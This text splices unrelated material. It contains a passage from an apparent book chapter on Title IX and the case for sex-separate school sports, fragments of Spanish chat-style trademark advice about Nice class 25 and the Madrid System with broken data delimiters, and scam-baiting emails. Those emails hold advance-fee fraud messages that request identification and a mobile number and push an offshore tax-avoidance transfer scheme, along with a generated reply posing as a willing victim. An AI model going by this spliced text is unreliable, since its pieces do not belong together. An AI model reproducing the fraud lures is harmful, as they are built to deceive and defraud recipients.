genderblind opportunity structure.10 In the world of sports, however, it is much less clear that integration is or should be the primary goal of Title IX. As was true in 1972, sex segregation remains the norm for sports competition today, and there is no consensus, even among Title IX’s strongest proponents, that the law should aspire otherwise. When HEW was developing its proposal for Title IX regulations, some stakeholders argued for sex integration as the measure of equality. Among them, some women’s rights advocates acknowledged that temporarily separate sports programs for women might be necessary as a type of affirmative action but pushed for the ultimate goal of having men and women compete for a spot on the same team. Other stakeholders who supported sex integration, however, did so as a way of preserving the status quo. For example, during early debates over the Title IX regulations, some male athletic directors argued that colleges should be able to satisfy Title IX simply by opening tryouts to men and women, even if the end result was all-male teams with no additional female participation.11 Supporters of separate women’s sports programs vigorously resisted such proposals, arguing for a more substantive measure of nondiscrimination that would ensure meaningful opportunities to participate. The debate drove a wedge between women’s rights advocates over how best to achieve sex equality in sports. The feminist group most critical of sex segregation in sports, the National Organization for Women (NOW), argued that “separate but equal” was an inappropriate permanent baseline for sports, as for other areas of public life. But NOW acknowledged that sex-separate teams might be a necessary interim measure until the gap in training and experience closed and women could meaningfully compete with men. Other advocates of women’s sports were more comfortable with sex separation as a lasting baseline and pushed for measures of equality within sexseparate programs. The Association for Intercollegiate Athletics for Women (AIAW), for example, argued for separate teams for all men’s and women’s sports, with proportionate funding.12 The organization made the case that giving women control over their own resources would allow them to develop their own model of sports rather than simply replicate what men had designed for themselves. Separation would allow women broader opportunities in sport instead of limiting them to the sports selected for men. More important, the group hoped that women’s programs might avoid the commercialism that was already taking hold in men’s programs, and emphasized broad participation, instead of spending vast sums on a few elite athletes.13 The AIAW represented female physical educators, the vast majority of whom would have been pleased with separate teams, as long as they had sufficient resources to succeed. Sifting through the arguments in 1973, HEW’s Office for Civil Rights initially considered two very different approaches: (1) opening up team tryouts to all athletes, male and female; or (2) keeping sex-separate programs but developing measures of equality to ensure equal opportunities.14 By 1974, when it issued draft regulations, HEW had rejected the first option. Instead, the draft regulations issued for public “notice and comment” required educational institutions to annually gauge the athletic interests of their student bodies and to engage in affirmative action to increase women’s opportunities in sports.15 The “affirmative efforts” requirement included providing women with training and support and encouraging them to take advantage of existing athletic opportunities. The agency received nearly ten thousand sets of written comments on the draft regulations, prompting Secretary Casper Weinberger to observe, with a tinge of sarcasm, that “the most important issue in the United States today is intercollegiate athletics.”16 Various interest groups opposed the draft regulations, including the NCAA, which feared the regulations would have the effect of taking resources away from men’s sports. After sorting through the comments, HEW made substantial revisions before issuing final regulations in 1975. The Javits Amendment had given Congress a window of opportunity to block the regulations if it disapproved of them. Backed by the NCAA and the big-time football schools, members of Congress introduced several resolutions to stop the regulations from taking effect. Supporters fought back in congressional hearings on the regulations, putting forward extensive evidence on the extent and magnitude of sex discrimination in intercollegiate athletics. Among the many examples, Ohio State University was noted for spending 1,300 times more money on male than on female athletes.17 The effort to disapprove the regulations ultimately failed, and they went into effect in the summer of 1975.18 They allowed for a three-year grace period for athletic programs, requiring full compliance by 1978. The deadline passed with very little effort toward compliance, but there was much continuing dialogue about exactly what the regulations required. Title IX’s Baseline: Separation, Not Integration The final Title IX regulations reflect the determination that gender neutrality in team tryouts is insufficient to provide real equality for women in sport. And yet, the structure of the regulation on equal athletic opportunity is itself interesting, and reflects some ambivalence about sex segregation in sports even as it rejects assimilation as the full measure of equality. The key regulation begins with a strong statement endorsing gender integration in sports. The first section states: (a) General. No persons shall, on the basis of sex, be excluded from participation in, be denied the benefits of, be treated differently from another person or otherwise be discriminated against in any interscholastic, intercollegiate, club or intramural athletics offered by a recipient, and no recipient shall provide any such athletics separately on such basis. 19 After this strong statement endorsing sex integration in sports programs, the next part of the regulation reads like a jarring reversal: (b) Separate Teams. Notwithstanding the requirements of paragraph (a) of this section, a recipient may operate or sponsor separate teams for members of each sex where selection for such teams is based upon competitive skill or the activity involved is a contact sport.20 Although the structure of the regulation suggests that integration is the general rule, with sex separation being the exception, in reality the reverse is true. At least at the varsity level, team selection is always based on competitive skill, which means that sex-separate teams are allowed in both contact and noncontact sports. If sex separation is the exception, then it is the exception that swallows the rule. By using the term “may” rather than “shall,” the Title IX regulation itself does not require separate athletic offerings for men and women. However, by permitting sex-separate programs under most circumstances, the Title IX regulations left intact the reality of sex-segregated sports. Moreover, it is not at all clear that a gender-blind team selection process would satisfy the regulation’s commitment to equal athletic opportunity. A separate requirement in a later provision of the regulation, discussed in depth in chapter 3, requires equal athletic opportunity in the selection of sports and levels of competition so as to effectively accommodate the interests and abilities of members of both sexes.21 In its comments on this part of the regulations, HEW explained that this provision may effectively require schools to provide separate teams for male and female athletes. In order to accommodate the interests and abilities of women, the agency advised, “an institution would be required to provide separate teams for men and women in situations where the provision of only one team would not ‘accommodate the interests and abilities of both sexes.’”22 Whether merely permitted or actually required by Title IX, sex-separate teams for women have remained the norm in the post–Title IX era. This reality fundamentally shapes the rest of Title IX’s approach to equal athletic opportunity. Within the baseline of separation, there is some allowance in the Title IX regulations for integration rights, a topic taken up in the next chapter, but coed sports are the exception and not the rule. This has generated a longstanding debate about whether sex-separate teams can ever be truly equal and whether separation is the best baseline under Title IX. A (Locker) Room of One’s Own: The Case for Separation The case for having a baseline of separate sports for men and women dates back to the pre–Title IX years, when women athletic administrators were in the early stages of developing women’s sports. In 1963, female athletic administrators attending the NCAA annual convention asked the NCAA not to allow women to compete on men’s teams.23 They had several rationales, including a fear that women would be hurt in competition with men, a concern about a potential talent drain from women’s sports, and a desire to prevent women’s programs from developing along the same lines as men’s sports, with their scandals and commercialism. In addition, the push for maintaining separate women’s programs was based on a desire to maintain control over women’s sports by female educators, who placed a different, more educational value on sports than the administrators who ran men’s sports. Early judicial rationales for sex separation in sports emphasized physical differences and the potential for women to be injured in coed competition. However, as such rationales came to be viewed as chauvinistic and inconsistent with emerging legal norms on gender discrimination, the dominant rationale shifted to an emphasis on protecting women’s increasing athletic opportunities from male encroachment. An important test case arose in 1980. It involved a talented eleven-year-old girl, Karen O’Connor, who wanted to try out for the sixth-grade boys’ basketball team. Karen had played basketball with boys in youth sports leagues since she was seven years old. Although the junior high school she attended offered both girls’ and boys’ basketball teams, Karen believed that only the boys’ team could offer her the level of competition that would enable her to develop her skills. When school officials insisted that she try out for the girls’ team or not compete at all, as required by the school’s athletic conference, Karen’s parents sued on her behalf, bringing claims under both Title IX and the equal protection clause.24 Karen’s ability to compete with boys on the basketball court was not the issue. As the court of appeals acknowledged, “a professional basketball coach who observed her play rated her ability as equal to or better than a female high school sophomore and equal to that of a male eighth-grade player.”25 Nevertheless, the appellate court reversed the lower court’s ruling that she had a right to try out for the boys’ team. Emphasizing that the teams were equal except for the level of play by the athletes themselves, the court ruled that the school district’s decision to maintain separate girls and boys teams was justified by the important objective of increasing girls’ overall participation in sports.26 U.S. Supreme Court Justice John Paul Stevens, who sided with the school district in an earlier proceeding in the case, made a similar point:27 In my opinion, the question whether the discrimination is justified cannot depend entirely on whether the girls’ program will offer Karen the opportunities that are equal in all respects to the advantages she would gain from the higher level of competition in the boys’ program. The answer must depend on whether it is permissible for the defendants to structure their athletic programs by using sex as one criterion for eligibility. If the classification is reasonable in substantially all of its applications, I do not believe that the general rule can be said to be unconstitutional simply because it appears arbitrary in an individual case.28 Justice Stevens’s remarks reflect the tension between a model of equality that prioritizes the goal of advancing the position of a social group and one geared toward ensuring that individuals are not penalized by their social group membership. His position, and that of the appellate court, prioritizes the rights of the social group, women, to maximize their overall athletic opportunities. Under this reasoning, if team selection were made on a gender-blind, individualized basis, male athletes would likely dominate sports teams, leaving fewer opportunities for women. Even if men could somehow be kept off of women’s teams, there would still be a significant cost to women’s sports. The talent drain from having the best female athletes play on “men’s” teams could slow the development of women’s sports, depriving other women of the chance to compete against the best women in the game. Interest in women’s sports might develop more slowly as a result, with women’s teams being further stigmatized for including only those women not good enough to get onto the “men’s” team. The more recent controversy over the teen golf phenomenon Michelle Wie and her effort to play in the men’s league shows that the same set of concerns still arises when elite women athletes seek to leave the women’s game to compete with men. When Wie took the game by storm as a fifteen-yearold, generating the kind of public attention and media spotlight rarely seen in women’s golf, many supporters of the Ladies Professional Golf Association (LPGA) feared that her determination to play in the Professional Golfers’ Association (PGA) would hurt the women’s league. As one sports writer described the predicament, “No wonder the LPGA is nervous about Wie. It cannot afford to lose golf ’s starlet to a man’s world.”29 Wie’s foray into the men’s game generated a great deal of press attention, but her fame quickly faded when she did not excel in that venue. Some perceived it as a slight to the LPGA, in which Wie had yet to distinguish herself as a champion comparable to the likes of Annika Sorenstam. One commentator lamented, “Michelle Wie would generate more attention for playing poorly at men’s events than Sorenstam did for winning against women. Which, of course, is a shame.”30 By choosing to compete against men, elite female athletes may send the message that competition with men is more worthy of public attention and accolades than women’s sports. The O’Connor case typifies the rationales courts use to justify sex segregation in sports. The Sixth Circuit Court of Appeals used similar reasoning in another watershed case that addressed the constitutionality of sex separation in sports, this time overturning a lower-court ruling that Title IX’s allowance for separate teams in contact sports violated the equal protection clause of the U.S. Constitution. The Sixth Circuit ruled that a school district has the discretion to offer coed opportunities where doing so furthers equal opportunity for girls, as for example where there is no comparable girls’ team in the sport. However, the court rejected the argument that Title IX’s allowance of sex-separate opportunities violates the equal protection clause. The court took a more substantive approach to equality, explaining, “[w]hen males and females are not in fact similarly situated and when the law is blind to those differences, there may be as much a denial of equality as when a difference is created which does not exist.”31 The court continued, expressing its concern for promoting real opportunities for girls: When considering the constitutionality of Title IX and its regulations, a blanket requirement of one team at each age level might result in male dominance of all teams and cause a return to pre-Title IX conditions, a result completely at variance with the statute’s purpose. It is desirable to maximize the opportunities for individual women, but a requirement that boys play only on boys’ teams while girls may compete either with the boys or in an all-girls’ program (as they wish) might have a similar undesirable effect on the fledgling women’s athletic programs; women’s athletics may be significantly harmed if the best female competition is lost to the boys’ program.32 Like Justice Stevens in his opinion in the O’Connor case, this court viewed Title IX as protecting the rights of women as a group over the occasionally conflicting interests of exceptional female athletes.33 There is, of course, a significant cost to this model of equality that emphasizes what is best for women as a group. Exceptionally gifted athletes like Karen O’Connor who are able to compete with male athletes may be worse off because they are denied the chance to play at the highest level. Karen O’Connor felt so strongly about her preference for competing with boys that, after losing in court, she chose not to try out for the girls’ team and to forgo playing basketball at the school.34 Limiting exceptional female athletes to competition on women’s teams may keep the very best female athletes from developing to their full potential, depriving the public of seeing just how good top female athletes can become. Faced with this tension, Title IX sides with a group-based vision of equality, emphasizing the goal of developing strong women’s sports programs that expand women’s overall opportunities. As Justice Stevens explained, “without a gender-based classification . . . there would be a substantial risk that boys would dominate the girls’ program and deny them an equal opportunity to compete in interscholastic events.”35 Such an approach would leave many girls and women shut out of varsity sports entirely, relegated to second-tier sports competition. In such a world, there would be too few female athletes competing to shift cultural gender norms. The few women competing at high levels would be perceived as tokens and as exceptional female athletes who are recognized because of their differences from other women, thereby ultimately reinforcing the norm of female athletic inferiority rather than contesting it. As Michael Messner, a scholar of sport and sociology, has warned, mixed-sex competition under the guise of “equal opportunity” and liberal feminism “is likely to become a new means of solidifying the ideological hegemony of male superiority” by “provid[ing] support for the ideology of meritocracy while at the same time offering incontrovertible evidence of the ‘natural’ differences between males and females.”36 In other words, a shift from sex separation to a gender-blind selection process would send the message that men have “earned” their privileged status in sports, while reinforcing the notion that few women belong in sport, and only if they can compete on men’s terms. Indeed, in the battle over the meaning of equal opportunity in sports, the gender-blind approach has often been a strategy for thwarting more substantive measures of equality. When a class of female athletes sued Temple University in the 1980s for not allocating enough funding, resources, or opportunities for women to play varsity sports, Temple responded that its varsity men’s teams just happened to be filled by men. In actuality, Temple claimed, the teams are open to any athlete good enough to make them, male or female. As a result, Temple argued, the funding, resources, and opportunities provided to athletes on teams filled by men should count as programs that support female athletes, as well. This argument did not prevail, and the female athletes who brought the case eventually won an important settlement requiring Temple to put more resources into its women’s sports program. More recently, Florida’s state high school athletic association used a similar argument in attempting to defend a 20 percent schedule reduction for varsity sports that exempted football. Classifying football as a coed sport since girls as well as boys could try out, the association argued that the schedule cuts were gender-neutral. It later backed down from this argument when parents of female athletes filed a Title IX lawsuit, alleging that the exemption of football left girls bearing the brunt of the cuts. The case was settled when the association agreed to rescind the schedule changes.37 In addition to protecting large numbers of competitive sports opportunities for women, the case for sex separation also considers how best to structure sport to make it an empowering experience for girls and women. Many girls and women prefer having their own teams, where they are less likely to feel threatened, inadequate, or unwelcome.38 Research on coed sports suggests that male athletes tend to take over, keeping women from playing or fully developing their skills and confidence.39 The sports anthropologist Faye Linda Wachs explains that “when girls attempt to join boys in sports, they often find themselves ignored, placed in devalued positions (positions to which the ball is rarely hit), and they do not receive the same instruction and encouragement as the boys.”40 Her study of adult coed softball found that male athletes used a number of strategies for limiting women’s participation, including “positional segregation,” that is, the “gendering” of field positions and the placement of players into positions by gender. Through this tactic, women were more likely to be placed in “helper” positions where they would pass the ball to others, rather than make the play themselves. Another strategy identified in the study was “the switch,” in which male players temporarily switched positions with female players in order to make a play. For example, a male outfielder would run into a female player’s territory and shout, “I got it,” even if the female player was well positioned to catch the ball. Wachs explains how these kinds of practices become a self-fulfilling prophecy. Anticipating the “switch,” a female athlete will play more tentatively, unsure of whether to step in and make the play or leave it to a male colleague.

A continuación, se detallan algunos puntos claves a considerar: 1. **Suficiente Distinción**: La marca con la letra agregada debe ser lo suficientemente distintiva del registro en Francia y cualquier otra marca similar en la industria relevante. Las marcas no pueden ser demasiado similares a otras ya registradas, ya que esto podría causar confusión. 2. **Derechos de la Marca**: Los derechos de marca generalmente se otorgan al primero en registrar la marca, no necesariamente al primero en usarla. Sin embargo, en algunos países y jurisdicciones, el uso previo y sustancial puede proporcionar ciertos derechos o puede servir como base para disputar un registro existente o futuro. 3. **Presencia en Redes Sociales**: Tener una presencia sólida y reconocible en las redes sociales puede ser beneficioso en casos donde necesitas demostrar la existencia de una base de clientes o reconocimiento de marca. Sin embargo, por sí sola, la presencia en redes sociales generalmente no es suficiente para establecer derechos legales de marca. 4. **Disputas de Marca**: En caso de una disputa de marca, el tener precedentes de uso puede ser útil, especialmente si puedes probar que has estado utilizando la marca de manera comercial antes de la existencia del registro conflictivo. Cada caso es único y depende de las circunstancias exactas y de las leyes y prácticas de cada jurisdicción. 5. **Registros en Otros Países**: Aunque una marca similar esté registrada solo en Francia, si tienes la intención de expandir tu marca internacionalmente, podrías enfrentarte a disputas legales o ser bloqueado por la existencia de la marca registrada cuando intentes entrar a ese mercado. 6. **Asesoramiento Legal**: Es imperativo obtener asesoramiento legal de un abogado especializado en propiedad intelectual. Este podrá evaluar el riesgo de confusión con marcas existentes, revisar el contexto específico de tu industria y ayudarte a navegar tanto los aspectos legales del registro de marcas como cualquier posible conflicto futuro. En resumen, aunque la inclusión de una letra pueda diferenciar tu marca, esto no garantiza automáticamente que evitarás conflictos de marcas en el futuro. Antes de proceder con cualquier registro, es crucial realizar un análisis exhaustivo de búsqueda de marcas y consultar con un especialista para determinar la mejor estrategia para tu marca y tu negocio."},{"prompt":"Veo que hay varias marcas registradas en los mismos paises Estan estas: RE ONA Owner RE ONA Inc.

Si dos marcas están registradas en clases diferentes, es menos probable que se consideren en conflicto directo, puesto que no compiten en el mismo mercado o categoría. 2. **Distinción Visual y Fonética**: Dos marcas pueden sonar de manera similar o tener elementos de texto comunes, pero si hay una diferencia visual o fonética suficiente entre ellas, pueden ser registradas por diferentes propietarios. Los logotipos, colores y otros elementos gráficos también juegan un papel en la distinción de la marca. 3. **Jurisdicción y Alcance Geográfico**: Una marca puede estar registrada nacionalmente en un país y otra marca similar puede tener un registro regional (como la Unión Europea) o internacional que incluya ese mismo país, siempre que haya suficiente diferenciación o no exista un conflicto en el examen de las solicitudes. 4. **Uso y Reconocimiento de la Marca**: En algunos casos, la notoriedad o el reconocimiento de una marca pueden permitir la coexistencia de marcas similares, especialmente si una marca tiene un uso establecido y no se considera que causará confusión con la otra. 5. **Acuerdos de Consentimiento**: A veces, los titulares de marcas llegan a acuerdos de consentimiento que permiten que ambas marcas coexistan, normalmente con ciertas restricciones para evitar la confusión del consumidor. 6. **Evaluaciones de las Oficinas de Marcas**: Cada oficina nacional o regional de marcas realiza su propia evaluación de las solicitudes de registro. Las decisiones pueden basarse en factores legales específicos y en el criterio de los examinadores de marcas, lo que puede llevar a la aprobación de marcas similares. Dicho esto, la posibilidad de registrar marcas similares no significa que no haya conflictos. Los titulares de marcas tienen derecho a oponerse a registros nuevos si consideran que hay una infracción en sus derechos, especialmente si creen que puede haber confusión entre los consumidores o una dilución de la fuerza de su marca. Es importante remarcar que cada caso de registro y disputa de marca es único y depende de una amplia gama de factores específicos.

Aquí están algunas explicaciones de por qué esto puede suceder: 1. **Amplitud de la Clase**: La Clasificación de Niza es muy amplia en su cobertura. Por ejemplo, la clase 25 incluye una amplia variedad de tipos de ropa y calzado. Dos marcas pueden estar registradas en la misma clase pero para diferentes tipos de productos dentro de esa clase. 2. **Consentimiento entre Titulares de Marca**: Si los titulares de marcas son conscientes de la existencia de otros y no consideran que haya conflicto, o si creen que sus mercados son suficientemente distintos, pueden concertar acuerdos de coexistencia que permitan a ambas marcas estar registradas simultáneamente. 3. **Uso Específico y Reconocimiento**: Las marcas pueden ser reconocidas para diferentes usos, o una puede tener un reconocimiento significativo en un mercado o segmento que no se solape con los otros. En algunos casos, las marcas pueden coexistir sin que se confundan los consumidores. 4. **Registro en Diferentes Territorios**: Aunque todas estas marcas pueden estar registradas bajo la clase 25, sus registros pueden ser en diferentes jurisdicciones geográficas o con diferentes alcances, como nacionales, regionales (como la UE) e internacionales. 5. **Elementos Distintivos y Diferenciación**: Las marcas pueden contener elementos comunes pero también tener características distintivas que las diferencien entre sí, como logotipos, estilos de letra o combinaciones de palabras que las hacen únicas. 6. **Procesos de Oposición y Disputas**: En algunos casos, las marcas similares pueden haber pasado por procesos de oposición que finalmente permitieron su coexistencia. O posiblemente, las oposiciones aún no se han presentado si las marcas son muy nuevas. 7. **Limitaciones en los Derechos de Marca**: Los derechos de marca no son absolutos y pueden estar limitados por varios factores, como el tipo de producto, el área geográfica de uso y la forma específica en que se utiliza la marca (marca de palabra vs. logotipo, por ejemplo). Por último, también es posible que aunque existan registros similares, en el futuro puedan surgir disputas legales si uno de los propietarios de la marca cree que hay una infracción a sus derechos o confusión entre los consumidores. En tales casos, será tarea de las autoridades competentes o de los tribunales determinar si debe mantenerse la coexistencia de las marcas o si alguna de ellas infringió los derechos de la otra."},{"prompt":"Bajo este concepto si tengo una variable diferente a ONA en colombia para la nice class 25 es probable que en el futuro pueda registrar mi nombre en varios paises, puesto que hay una distinción en las letras de la palabra?","completion":"Sí, es posible registrarse en varios países con una marca que tenga una variación del término \\"ONA\\" siempre y cuando cumpla con ciertos criterios que las oficinas de marcas consideran al evaluar las solicitudes de registro. Aquí hay algunos factores importantes: 1. **Diferenciación**: La variación debe ser lo suficientemente distintiva para evitar la confusión con marcas existentes en la misma clase. Esto no solo se refiere a la diferenciación fonética o visual sino también a la distintividad conceptual y comercial. 2. **No Confusión**: Tu marca no debería causar confusión en el mercado ni estar asociada con las marcas previamente registradas que tienen productos/servicios en la misma clase. Las oficinas analizarán si las marcas son suficientemente diferentes en términos de apariencia, sonido e impresión general. 3. **Búsqueda de Marca**: Antes de intentar registrar tu marca, es crucial hacer una búsqueda exhaustiva en la Global Brand Database y otras bases de datos relevantes para asegurarte de que no hay registro previo de una marca idéntica o similar en los países donde deseas registrar. 4. **Evaluación Local**: Cada país tiene sus propios criterios y leyes de marca, y tus posibilidades de éxito pueden variar de un lugar a otro. Es vital considerar que lo que es aceptable en Colombia puede no serlo en otro país. 5. **Rechazos y Oposiciones**: Incluso con una marca concebida para ser distinta, puede haber oposiciones por parte de los propietarios de los registros de marcas similares. Es importante estar preparado para defender tu marca y, si es necesario, negociar acuerdos de coexistencia. 6. **Presencia de la Marca y Uso Previo**: La presencia de tu marca en el mercado y el uso previo pueden fortalecer tu posición en casos de disputas, especialmente en jurisdicciones que otorgan derechos basados en el uso en lugar de solo en el registro. Si tienes una variante distinta de \\"ONA\\" y quieres proteger tu marca internacionalmente, sería prudente discutir tu estrategia de registro con un abogado especializado en propiedad intelectual.

Aquí se evaluará si tu marca cumple con los requisitos de registrabilidad y si no hay marcas previamente registradas que sean idénticas o similares en la misma clase. 2. **Registro Internacional**: Para proteger tu marca en otros países, puedes utilizar el Sistema de Madrid, administrado por la OMPI, el cual permite solicitar la protección de tu marca en varios países a la vez, a través de un sistema centralizado y una única aplicación. 3. **Nice Classification**: La Clasificación de Niza es un sistema internacional que clasifica los bienes y servicios en 45 clases para el registro de marcas (34 para productos y 11 para servicios). Esta clasificación estandarizada facilita los procedimientos de solicitud y evita confusiones al determinar áreas específicas de protección. # Coexistencia de Marcas bajo la Misma Nice Class Varias marcas pueden coexistir bajo la misma clase de Niza debido a numerosos factores: 1. **Amplitud de la Clase**: Las clases de la Clasificación de Niza abarcan una amplia gama de productos o servicios, por lo que dos marcas pueden registrar productos o servicios diferentes dentro de la misma clase. 2. **Diferenciación Suficiente**: Aunque las marcas tengan nombres similares, pueden tener suficiente diferenciación en términos de logotipos, gráficos o combinaciones de palabras que evitan confusión entre los consumidores. 3. **Evaluaciones Independientes**: Las oficinas de marcas nacionales y regionales realizan sus propias evaluaciones, lo que puede llevar a la aprobación de solicitudes de marcas con nombres similares en países diferentes. 4. **Acuerdos de Consentimiento**: En ocasiones, los titulares de marcas llegan a acuerdos que les permiten coexistir en el mercado, evitando así litigios. 5. **Uso y Reconocimiento**: Marcas con nombres similares pueden ser usadas en contextos diferentes, teniendo mercados distintos o grupos de consumidores que no se solapan. 6. **Oposiciones y Disputas**: Las marcas pueden enfrentar oposiciones durante el proceso de registro, y si no hay oposiciones o estas son superadas, pueden coexistir. En resumen, para registrar una marca en Colombia y a nivel internacional, es necesario considerar el registro local primero y luego expandirse utilizando herramientas como el Sistema de Madrid, siempre asegurándote de que tu marca cumple con la clasificación de Niza y se diferencia lo suficiente de las marcas existentes para evitar conflictos.

Although been before anything I am on the road so I couldn't get you so I ask you here back again to say yes have you sent email to me and you should said yes that you have sent email already to me.But then why can't you call me on the telephone and then both of us would have speak to each other voice to this I mean to fix to summarize.Well friend McCaffrey over all Personally I am very delighted over your efforts in all. To this end, I mean kindly you should wait patiently to hear from me maybe by tomorrow so that I will get out best time during today's noon break to read fine to get you response, because this morning I just have this little time to just post you over that I have confirmed your email, so kindly give me little time till tomorrow as I just returned back yesterday towards evening time and today first thing I,and my colleagues need to report get back files over solutions before any other thing, of which that will take some time out and that is all about that, so I apologize for disturbing, I hope in all you get me understand, I apologist you for any inconveniences caused for my delay before tomorrow which before anything else by the next day I mean tomorrow surely you will see my reply from my side to the things I feel better about it to move on ahead with. Thank you Again if you mean mentioned this ((((((((((Regarding our investment funds in the US and their management, your message has been well taken. I understand that we need to handle these transfers with discretion and abide by all regulations to ensure everything runs smoothly. ))))))))))))) HOWEVER, I want you to understand how funds work. If moneys goes into a corporate account, it will be taxed, UNLESS it is shown as a “loan”…it is treated as income…In the US such rates are tiered,but the last tier could be as much as 35% of the total….a HUGE amount of money. What I had planned for was get the funds into a safe place, like Dubai or other offshore, then over time send funds to USA, while you are there,into your own PERSONAL account,whereupon you will be taxed as you go, but in pieces, meanwhile the funds elsewhere will be invested and throw off “interest” the Return on “investment” plus thee still will be the original funds….so rest assured that I have been concerned about your understanding regarding investment funds to be balance receiving fine for best interest of all!!!!!!!. McCaffrey in your email response to me on Tuesday, February 20,2024 was this (((((((( Detailed profiles and credentials of the Empower representative and any other officials who will act on behalf of our partnership. ))))))). Then Meanwhile. I myself have told you everything that you need to know about the Empower representative that the Empower representative will be NOT having anything to do to meet you up anywhere apart from Holland where things are made to take place. So from the things I have even before now made it all clearly to you was this I STATED TO YOU ON THE February 22, 2024 EMAIL I SENT TO YOU TELLING YOU THAT I still have much difficulty re reading much of what you say each time; just some fundamental differences in language and meaning, so I try to respond to you, but if I have failed to, it is not because I am ignoring you, but because I just do not know what to say in all that you provide and since it can be so confusing and unclear. Sorry, but just a problem. that each time I mention things about the Empower representative you will come up as always you do to say if there will be a meeting by both of you before you will go to Holland. Look McCaffrey we are not here for researching the law.But both of us are having Business relationship together that both of us highly need a giving legal opinions that will enable us to reach our goal.And note as well that the empower Rep is NOT a kind of Legal project manager or Lawyer to this.But it is just to represent me orderly to meet you up been all I have clearly told you. So Take this McCaffrey. I MEAN AGAIN HERE READ THIS IS WHAT YOU SENT TO ME ON Tuesday, February 20, 2024 ((((( Having read your email, now more than ever,I believe that a face-to-face or virtual meeting with the Empower representative before my trip to Amsterdam would be beneficial.This would not only solidify our relationship but also accelerate the expeditious conclusion of our agreement and arrangements. )))))))))))))))). Yes again after all I have took time to time to explained it to you on how it will work fine. McCaffrey. And so you still came back here again in your last week Friday 23rd February, 2024 email to make the same statement saying this (((((((( I am also in support of having a meeting with the Empower representative, either face-to-face or virtually, to solidify our understanding before I plan my trip to Amsterdam. This will be an excellent opportunity to discuss any final details and build our working relationship. ))))))))). As if it was not been made clear to you about it all that both of you will meet up in Holland.So if don't need anything to discuss with empower Rep or what kind of any final details did mean of which you should know of whatever final details from I myself who is having things directly with you or is it because I mentioned the empower Rep to go to Amsterdam to represent things on my behalf since I CANNOT BE THERE DUE to what I have even before now stated to you about myself duty position here. HOWEVER. I now have a severe problem that will make it impossible for me to not to understand you on your travel to Amsterdam. I did not see you address the critical issue of some amendment in our investment agreement for amendment to get things set up. I had proposed amendment BEFORE you go to Amsterdam. You have not said anything yet about this CRITICAL ITEM. SO CALL ME at the number provided (+2-299-9276775) SO THAT BOTH OF US CAN UNDERSTAND THIS MEANINGS FROM DIRECT VOICE TALKS. THANK YOU WHILE WAITING FOR YOUR TELEPHONE CALL I MEAN ONLY IF YOU CAN.BUT IF CANNOT ALSO WELL NO PROBLEM.SO YOU CAN DO WHATEVER YOU MAY So Friend McCaffrey let me know if should there be any need for evidence,or a proof of your seriousness and genuineness of our understanding to this business opportunity,I trust this breakdown clarifies the points of concern. Please feel free to express any further queries or provide your input as we all navigate this venture together Meanwhile, Greetings to you for our both mutual benefits of which always know that God is in total control and our prayer is that his will be done,so kindly hold on for me so that I will have cool mind to get all contents as it is taking place as well as being noted by you in the we both decision-making for you to re-set back things mentioned sure by you over final matters.

Sincerely Marlon,","completion":"Email #4, from Cameron (scam-baiter): Dear Marlon, Warm greetings to you, and I must say it's been quite enlightening understanding the various intricacies and critical aspects of the transaction we're about to embark upon. It’s an endeavor that fills me with both excitement and a sense of great responsibility. I'm glad to know that you're back in the office after your official duty trip. It’s admirable to see your dedication to local government development, and I hope that the installation of the necessary instrument tools on the military brass level was a resounding success, contributing significantly to the security and prosperity of the area near the border. Moving forward, I must admit that your approach to handling our investment funds seems judicious and well-thought-out. The strategy to mitigate excessive taxation by judicious funds management in offshore accounts, like Dubai, followed by a gradual transfer into personal US accounts to be taxed in sensibly sized increments, resonates with my understanding of prudent fiscal planning. Your foresight on the investment front, expecting the funds to generate interest while safeguarding the principal amount, is reassuring, to say the least. However, your last email has raised several important points which I need to contemplate further to ensure that I fully grasp the finer details of our arrangement. To this end, and to facilitate a more comprehensive understanding between us, I concur that a direct voice communication might indeed expedite matters and help clarify any ambiguities once and for all. Regarding your concerns about the amendment of the investment agreement prior to the Amsterdam meeting, I recognize the significance and will ensure that I address this urgently. Please understand that it wasn't an oversight on my part, merely that I needed more time to review the agreement in detail to ensure that the proposed amendments serve the best interests of both parties and align with legal protocols. As for the meeting with the Empower representative in Holland, I acknowledge your clear directives and understand that there will be no face-to-face meeting prior to my trip. This has been noted, and I will adjust my expectations accordingly. Regarding a phone conversation, I will do my best to place a call to you at the number provided, though I must mention my current schedule is heavily impacted with commitments. I will seek to find a suitable time where I can ensure we have a quiet and undisturbed environment in which to discuss these critical matters at length. Until such time, let’s continue our dialogue through email. In the spirit of moving forward, could you kindly provide me with a little more insight into the nature of the amendments you're suggesting? This way, I can start pondering the implications and formulating my input before our actual verbal discussion. Rest assured of my utmost commitment to this partnership and the shared success it entails for both of us. Your diligent communication has not gone unnoticed, and it has indeed fostered a strong foundation for our forthcoming collaboration. I will be in touch soonest to establish a time for our phone conversation. Sending you best regards and awaiting your detailed guidance on the aforementioned concerns. Yours sincerely, Cameron McCaffrey"},{"prompt":"Create a scam-baiting response to the most recent email, to keep the scammer in a false sense of security by posing as a potential victim.

Cameron Thank goodness that finally, I am able to get in touch with you after so many attempts. As I made clear to you, that I may not be too sure how you came about this huge sum of money; probably as an abandoned contract sum or an inheritance willed from a deceased relative, but since you have been designated as the beneficiary, the bureau is only authorised to collate and screen the records, then move the entire documents to the bank for subsequent payment to you. To follow up with the process, I will require you provide me with. 1. Your mobile number 2. Any means of identification and postal/physical address. to enable the bureau carry out preliminary verification. I want to make it clear to you that I don't need a cent/penny of yours to run this processing. And I will not demand any penny as fee from you because I am not in a position to do such. But get this clear Sir, I have a limit of assistance to offer you in getting this fund payment settled, my work ends in straightening up the obsolete documents, thereafter, you the rightful beneficiary will be required to contact the agency directly, conclude discussions with them, then get ready to fly into Johannesburg whenever it's time to have the biometric, signing of the voucher in the bank, and final payment of this fund into the very accounts you will provide. Note this, that nobody may be expected to do these stuffs for you, hence, anybody promising you any sort of shortcut, or going to transfer this huge sum of money on the air by requesting certain upfront fees from you while you relax in your home, is simply being fraudulent. Don't fall into such game. My brother, let it still be known to you that out of seven of you on this list, two are already confirmed to be dead, one person; Barbara Wolniakowski according to her daughter died during the corona virus pandemic. You are really lucky, I must tell you. Kindly get the few stuffs required from you 1. Your mobile number 2. And any means of identification to set the computation of your records in motion.

